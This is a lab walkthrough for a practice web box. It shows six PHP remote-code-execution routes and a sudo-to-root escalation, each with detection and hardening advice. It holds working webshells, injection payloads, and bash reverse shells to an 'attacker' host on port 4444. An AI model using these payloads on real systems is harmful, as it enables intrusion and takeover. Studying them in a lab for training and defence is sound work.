# Chapter 09 — "Foothold" · Debrief

> Full walkthrough of all six RCE routes on `hollow-portal-01`, the reverse
> shell that turns each into an interactive session, and the capstone to root —
> **with detection and hardening for each**. Spoilers throughout; play the box
> first (`targets/web/README.md`).

**Two flags:**

- **Foothold** — `/var/www/flag.txt` → `R2R{w3b_rce_is_your_front_d00r}` (readable by `www-data`; proves code execution).
- **Root** — `/root/flag.txt` → `R2R{www_data_t0_r00t_full_k1ll_cha1n}` (root only; proves the full kill chain).

The app is **Hollow Share**, Apache + PHP 8.3 on Ubuntu 24.04, reachable at
`http://127.0.0.1:8080/` (compose maps `127.0.0.1:8080 → 80`). The examples
below use `curl` for copy-paste; in practice you drive these from a browser +
Burp. Reverse shells call back to the `attacker` box over `labnet`.

> **One mental model for the whole chapter:** a web app is a program that runs
> attacker input. Six features here each take your input to a dangerous sink —
> the filesystem-as-code, a shell, `include()`, a template compiler, and
> `unserialize()`. Find the sink, and you are executing code.

---

## 0. The reverse shell (you need this for every route)

Every route below gives you command execution as `www-data`. Turn it into an
interactive shell on your attacker box.

**Listener (attacker):**

```bash
nc -lvnp 4444
```

**Payload the web app runs:**

```bash
bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'
```

`bash -c '...'` matters: `system()`/`shell_exec()` run the string under `/bin/sh`
(dash on Ubuntu), and **dash has no `/dev/tcp` and no `>&`**. Wrapping the
redirect in `bash -c` makes *bash* parse it. See the wiki's
**Reverse-Shell-Reference** for the full catalog (nc, mkfifo, python3, php,
perl, socat) and the TTY upgrade.

**Upgrade the dumb shell to a real TTY** (so `sudo`, `vi`, job control work):

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z
stty raw -echo; fg
export TERM=xterm
```

---

## Route A — Unrestricted file upload → webshell  ·  ★☆☆☆

### 1. Recon
`/upload.php` accepts a file and tells you it is served back at
`/uploads/<name>`. No "images only", no size cap, no mention of type. That
combination — *user controls the filename and extension, and the file lands in
a web-served directory* — is the whole bug.

### 2. The flaw
`upload.php` calls `move_uploaded_file()` straight into `/var/www/html/uploads/`
with the original name. The uploads directory is under the document root, so
Apache + mod_php will **execute** any `.php` in it.

### 3. Exploit
```bash
# a one-line webshell
echo '<?php system($_GET["c"]); ?>' > shell.php
curl -F "file=@shell.php" http://target-web/upload.php

# run commands as www-data
curl 'http://target-web/uploads/shell.php?c=id'
curl 'http://target-web/uploads/shell.php?c=cat+/var/www/flag.txt'
#   -> R2R{w3b_rce_is_your_front_d00r}

# reverse shell (listener running on the attacker):
curl -G 'http://target-web/uploads/shell.php' \
     --data-urlencode 'c=bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"'
```

### 4. Why it works
mod_php maps any file ending in `.php` to the PHP interpreter, anywhere under
the document root. An uploader that preserves the attacker's extension and
writes into a web-served, code-executing directory hands the attacker a script
they then request. It runs as the Apache user, `www-data`.

### 5. Detect
- A file-integrity watch on upload directories: any new `.php`/`.phtml`/`.pht`
  under an uploads path is an incident. `find /var/www -newer … -name '*.ph*'`.
- Access logs: a `POST /upload.php` immediately followed by a `GET
  /uploads/<something>.php?c=…` is the signature.

### 6. Harden
- Store uploads **outside the document root** and stream them back through a
  script that sets `Content-Disposition: attachment` and a fixed content type —
  never let the web server execute the upload dir.
- Allow-list extensions and verify content; randomise the stored filename.
- Turn PHP execution **off** for the upload path (`php_admin_flag engine Off`,
  or no handler), and mount it `noexec` where you can.

### 7. Real world
This is the single most common path from "file upload feature" to RCE, and it
underpins countless CVEs in CMS plugins and admin panels. OWASP: *Unrestricted
File Upload*.

---

## Route B — Upload filter bypass  ·  ★★☆☆

### 1. Recon
`/share.php` is the "hardened" uploader: it blocks a deny-list of extensions
(`.php .phtml .php4 .php3 .phps`) and requires an image `Content-Type`. Both
checks are attacker-controlled, and the server runs more PHP extensions than the
deny-list blocks.

### 2. The flaw
Three mistakes stack:
- the extension check is a **deny-list on the last extension only** — it misses
  `.pht`, `.php5`, and double extensions like `x.php.jpg`;
- Apache (`config/hollow-share.conf`) runs `.pht`/`.php5`/`.phtml` as PHP and,
  via `AddHandler`, **any** name containing `.php` (so `x.php.jpg` executes);
- the `Content-Type` is whatever the client sends, and the shares dir allows
  `.htaccess` overrides.

### 3. Exploit
The intended win combines a non-blocked extension, image magic bytes, and a
spoofed image type:

```bash
# GIF89a header makes it sniff as an image; .pht dodges the deny-list;
# Content-Type is spoofed to image/gif.
printf 'GIF89a;\n<?php system($_GET["c"]); ?>' > shell.pht
curl -F "image=@shell.pht;type=image/gif" http://target-web/share.php

curl 'http://target-web/shares/shell.pht?c=cat+/var/www/flag.txt'
#   -> R2R{w3b_rce_is_your_front_d00r}
```

Other bypasses that also work here (try them):

```bash
# double extension — last ext passes the deny-list, AddHandler runs the .php
curl -F "image=@shell.php.jpg;type=image/jpeg" http://target-web/share.php
# .php5
curl -F "image=@shell.php5;type=image/png"    http://target-web/share.php
# .htaccess trick: upload a .htaccess that makes .jpg run as PHP, then a .jpg
printf 'AddType application/x-httpd-php .jpg\n' > .htaccess
curl -F ".htaccess=@.htaccess;type=image/gif"  http://target-web/share.php   # (rename field as needed)
```

### 4. Why it works
Blocking "the extensions I can think of" is a deny-list, and deny-lists leak.
`mod_mime`'s `AddHandler` treats **every** dot-separated component as an
extension, so a `.php` anywhere in the name selects the PHP handler. Magic
bytes satisfy naive content sniffers; a spoofed `Content-Type` satisfies the
header check. Each layer is bypassed by the layer the admin forgot.

### 5. Detect
- Alert on executable-by-PHP files in upload dirs regardless of extension:
  `grep -rl '<?php' /var/www/html/shares`.
- Any uploaded `.htaccess` is an incident on its own.

### 6. Harden
- **Allow-list**, don't deny-list: accept exactly `jpg/png/gif`, re-encode the
  image server-side (which strips an embedded payload), and store it with a
  server-chosen random name and extension.
- `AllowOverride None` on upload dirs; remove the `AddHandler`.
- Same as A: serve uploads from outside the docroot with execution disabled.

### 7. Real world
Double-extension and `.htaccess` upload bypasses are classic Apache findings;
`.phar`/`.phtml` tricks recur across PHP CMS CVEs. OWASP: *Unrestricted File
Upload* bypass techniques.

---

## Route C — OS command injection  ·  ★★☆☆

### 1. Recon
`/tools.php` is a "ping a host" box. Submit `127.0.0.1` and the page shows
`Running: ping -c 1 -W 1 127.0.0.1` with ping output — it is shelling out and
splicing your input into the command.

### 2. The flaw
```php
$cmd = "ping -c 1 -W 1 " . $host;   // raw concatenation
shell_exec($cmd . ' 2>&1');
```
No escaping, no allow-list. Any shell metacharacter in `host` runs as `www-data`.

### 3. Exploit
```bash
curl -G http://target-web/tools.php --data-urlencode 'host=127.0.0.1; id'
curl -G http://target-web/tools.php --data-urlencode 'host=127.0.0.1; cat /var/www/flag.txt'
#   -> ping output, then R2R{w3b_rce_is_your_front_d00r}

# reverse shell:
curl -G http://target-web/tools.php \
     --data-urlencode 'host=127.0.0.1; bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"'
```
`;` ends the ping and starts your command; `|`, `&&`, and `$(...)` work too.

### 4. Why it works
`shell_exec()` hands the whole string to `/bin/sh -c`. The shell re-parses your
metacharacters, so `; cat …` is a second command, not an argument to `ping`.
Building shell command lines by string concatenation is the root cause.

### 5. Detect
- Web logs with shell metacharacters in parameters (`;`, `|`, `` ` ``, `$(`).
- Process monitoring: `ping` (or `sh -c`) with a child like `bash`, `cat
  /var/www/flag.txt`, or an outbound socket is the signature.

### 6. Harden
- Don't shell out. Use a library/syscall (for ping: a raw-socket ping lib, or
  drop the feature). If you must, pass arguments as an **array** so there is no
  shell: `proc_open(['ping','-c','1',$host], …)` — never a single string.
- Validate `host` against a strict pattern (hostname/IP only) and reject
  everything else.

### 7. Real world
Command injection in "network tools"/diagnostic pages is a perennial router and
appliance CVE (`ping`, `traceroute`, `nslookup` fields). OWASP: *OS Command
Injection*.

---

## Route D — LFI → RCE  ·  ★★★☆

### 1. Recon
The help centre links `view.php?page=pages/home.php`. The `page` value is a
**path**, and the viewer includes it. Try `?page=/etc/passwd` — if you get the
password file, it is a Local File Inclusion.

### 2. The flaw
```php
$page = $_GET['page'] ?? 'pages/home.php';
include $page;      // no base dir, no sanitisation
```
`include` of attacker input is arbitrary file read, source disclosure, and —
because it **executes** any PHP in what it includes — remote code execution. The
box also ships `allow_url_include=On` (`config/99-hollow.ini`), which enables
URL-style wrappers.

### 3. Exploit — four techniques

**(a) Arbitrary read / source disclosure** with `php://filter` (base64 so PHP
doesn't execute the source you want to *read*):

```bash
curl 'http://target-web/view.php?page=/etc/passwd'
curl 'http://target-web/view.php?page=php://filter/convert.base64-encode/resource=prefs.php' \
  | grep -oE '[A-Za-z0-9+/=]{40,}' | base64 -d        # read the PHP source
```

**(b) Apache access-log poisoning → RCE** (the headline technique):

```bash
# 1) write PHP into the access log via the User-Agent (single quotes — Apache
#    escapes " in the combined log, which would break the payload)
curl -A "<?php system(\$_GET['c']); ?>" http://target-web/

# 2) include the log and drive it with ?c=
curl -G http://target-web/view.php \
     --data-urlencode 'page=/var/log/apache2/access.log' \
     --data-urlencode 'c=id; cat /var/www/flag.txt'
#   -> uid=33(www-data) … R2R{w3b_rce_is_your_front_d00r}
```

**(c) `data://` wrapper → RCE** (needs `allow_url_include=On`):

```bash
B64=$(printf '%s' '<?php system("cat /var/www/flag.txt"); ?>' | base64)
curl -G http://target-web/view.php --data-urlencode "page=data://text/plain;base64,${B64}"
```

**(d) `php://input` wrapper → RCE** (PHP goes in the POST body):

```bash
curl -X POST --data '<?php system("id"); ?>' \
     'http://target-web/view.php?page=php://input'
```

For a shell, make any of the above run the `bash -c '… /dev/tcp …'` payload.

### 4. Why it works
`include` compiles and runs PHP from whatever stream it is given. If you can get
PHP source into *any* file or stream the include can reach — a log you can write
to via a request header, or a wrapper that carries your bytes — the include
executes it. `php://filter` turns the same primitive into a source-reader by
base64-encoding the resource so it is returned as data, not run.

### 5. Detect
- Parameters containing `php://`, `data://`, `../`, or absolute paths to logs.
- `include()`/`require()` warnings in the PHP error log naming attacker paths.
- A `User-Agent` containing `<?php` in the access log is poisoning in progress.

### 6. Harden
- Never `include` user input. Map `page` to an **allow-list** of known files
  (`['home'=>'pages/home.php', …]`) and include only the resolved value.
- Set `allow_url_include=Off` and `allow_url_fopen=Off`.
- Lock log perms (`0640 root:adm`, dir `0750`) so the web user cannot read or
  include them; keep `open_basedir` tight.

### 7. Real world
LFI-to-RCE via log poisoning and PHP wrappers is a staple of PHP CTFs and real
CVEs alike (think `/proc/self/environ`, session files, and log includes). OWASP:
*Local File Inclusion* / *Path Traversal*.

---

## Route E — Server-Side Template Injection (Twig)  ·  ★★★☆

### 1. Recon
`/preview.php?name=Alex` renders `Hi Alex, …`. Probe with a template
expression: `?name={{7*7}}`. If the page shows **`Hi 49,`**, your input is being
*evaluated* as a template — SSTI, not plain reflection.

### 2. The flaw
```php
$tplSource = "<p>Hi {$name}, a file has been shared …</p>";
$twig->createTemplate($tplSource)->render();   // user input compiled as template
```
The user's text is spliced into the template **source** and compiled. Twig
expressions in `name` are executed, and Twig's filters reach PHP callables.

### 3. Exploit
```bash
# confirm
curl -G http://target-web/preview.php --data-urlencode 'name={{7*7}}'      # -> Hi 49,

# RCE via the map()/filter() gadget (Twig applies the named PHP callable)
curl -G http://target-web/preview.php \
     --data-urlencode "name={{['id']|map('system')|join}}"
curl -G http://target-web/preview.php \
     --data-urlencode "name={{['cat /var/www/flag.txt']|map('system')|join}}"
#   -> R2R{w3b_rce_is_your_front_d00r}

# reverse shell:
curl -G http://target-web/preview.php \
  --data-urlencode "name={{['bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\"']|map('system')}}"
```
`['cmd']|filter('system')` and `|sort('system')` work the same way.

### 4. Why it works
`createTemplate($userInput)` makes the user the template **author**, not just a
value. A non-sandboxed Twig environment exposes `map`/`filter`/`sort`/`reduce`,
which accept a callback name and invoke it via PHP — so `map('system')` runs
`system()` on your array element. The fix is to make the user a *value*, never
an author.

### 5. Detect
- `{{`, `}}`, `{%`, or `|map(`/`|filter(` in request parameters.
- Template-engine errors (Twig `SyntaxError`) in logs from user input.

### 6. Harden
- Pass user input as a **render variable** into a fixed template, never build
  template source from it:
  `$twig->render('greeting.html.twig', ['name' => $name]);`
- If dynamic templates are truly required, use Twig's **SandboxExtension** with
  a strict allow-list of tags/filters/functions.

### 7. Real world
SSTI is a high-severity bug class across Twig, Jinja2, Freemarker, Velocity, and
more; `{{7*7}}` is the universal probe. OWASP: *Server-Side Template Injection*.

---

## Route F — PHP insecure deserialization  ·  ★★★☆

### 1. Recon
Save a preference on `/prefs.php` and look at your cookies: `prefs` is a base64
blob. Decode it — `O:5:"Prefs":2:{…}` is a **serialized PHP object**. The server
`unserialize()`s a value you control on every load.

### 2. The flaw
```php
$obj = unserialize(base64_decode($_COOKIE['prefs']));   // no allowed_classes
```
`unserialize()` rebuilds **any** class in scope and fires its magic methods.
`inc/prefs_lib.php` ships a gadget:
```php
class MaintenanceTask {
    public $cmd = '';
    public function __wakeup() { if ($this->cmd !== '') system($this->cmd); }
}
```
`__wakeup()` runs during `unserialize()` itself — before the code even checks
what type it got back.

### 3. Exploit
Craft a serialized `MaintenanceTask` with your command, base64 it, send it as
the `prefs` cookie:

```bash
CMD='cat /var/www/flag.txt'
SER="O:15:\"MaintenanceTask\":1:{s:3:\"cmd\";s:${#CMD}:\"${CMD}\";}"
COOKIE=$(printf '%s' "$SER" | base64 -w0)
curl --cookie "prefs=${COOKIE}" http://target-web/prefs.php
#   -> R2R{w3b_rce_is_your_front_d00r}

# reverse shell: set CMD='bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"'
#   and recompute the string length (${#CMD}) before re-encoding.
```
(If you have `php` locally, `php -r 'echo serialize(new MaintenanceTask());'`
after defining the class is easier than counting bytes by hand.)

### 4. Why it works
`unserialize()` is a constructor for arbitrary objects. The attacker picks the
class and the property values; when PHP rebuilds the object it calls
`__wakeup()` (and later `__destruct()`). Any such method that touches a
dangerous sink with attacker-controlled data is a *gadget* — and one gadget in
scope is enough.

### 5. Detect
- `unserialize()` on any request-derived value (cookie, parameter, header) in
  code review; base64-of-`O:`/`a:` blobs in requests.
- Unexpected child processes from PHP right after a request with a crafted
  cookie.

### 6. Harden
- Don't deserialize untrusted input. Use `json_encode`/`json_decode` for
  cookies/state.
- If PHP serialization is unavoidable, pass
  `unserialize($data, ['allowed_classes' => [Prefs::class]])` so only safe
  classes are instantiable, and sign the blob (HMAC) so it cannot be tampered
  with.

### 7. Real world
PHP object-injection gadget chains (POP chains) are a major bug class —
Magento, WordPress plugins, Laravel/Symfony gadget chains (see `phpggc`). OWASP:
*Insecure Deserialization*.

---

## Capstone — www-data → root  ·  ★☆☆☆

You have a shell as `www-data`. Enumerate privileges the way you would on any
Linux box:

```bash
sudo -l
#   (ALL) NOPASSWD: /usr/bin/php
```

A "maintenance" sudoers drop-in (`/etc/sudoers.d/hollow-maintenance`) lets the
web user run **php** as root with no password — so the deploy pipeline could run
framework tasks. `php` is an interpreter, and an interpreter you can run as root
is a root shell:

```bash
sudo /usr/bin/php -r 'system("/bin/sh");'
# or straight to the flag:
sudo /usr/bin/php -r 'readfile("/root/flag.txt");'
#   -> R2R{www_data_t0_r00t_full_k1ll_cha1n}
id    # uid=0(root)
```

**Why it works:** sudo runs the command as root; `php -r` executes arbitrary PHP
as root; `system("/bin/sh")` is a root shell. Same lesson as Chapter 03 — a
`NOPASSWD` grant on any interpreter (or GTFOBins binary) is total.

**Detect:** `grep -rE 'NOPASSWD' /etc/sudoers /etc/sudoers.d`; a web-user sudo
grant on `php`/`python`/`perl`/`ruby`/`node` is a finding on sight.

**Harden:** never grant the web user sudo on an interpreter. If a deploy step
needs root, give it a single, argument-validated wrapper script (root-owned,
non-writable) that does exactly one thing — not a language runtime. Better: run
deploy tasks under a dedicated service account via a queue, not `sudo` from the
web process.

---

## Putting it together — the full kill chain

```text
browser + Burp
   │  Route A–F  →  code execution as www-data
   ▼
curl .../uploads/shell.php?c=bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"
   │  reverse shell
   ▼
www-data@target-web  →  cat /var/www/flag.txt   (foothold flag)
   │  sudo -l  →  (ALL) NOPASSWD: /usr/bin/php
   ▼
sudo php -r 'system("/bin/sh")'  →  root  →  cat /root/flag.txt   (final flag)
```

Six front doors, one hallway (`www-data`), one short flight of stairs to root.

---

## Clean up / reset

Each route writes a webshell or log entry but changes no persistent state that a
rebuild won't clear. To return the box to pristine-vulnerable:

```bash
make reset-web
# or:
docker compose up -d --build --force-recreate target-web
```

That wipes uploaded shells, resets the access log, and restores the planted
config. For the defender's single-page reference across all of this —
upload hardening, input validation, `disable_functions`, egress filtering to
kill reverse shells — see the wiki's **Blue-Team-Playbook**.
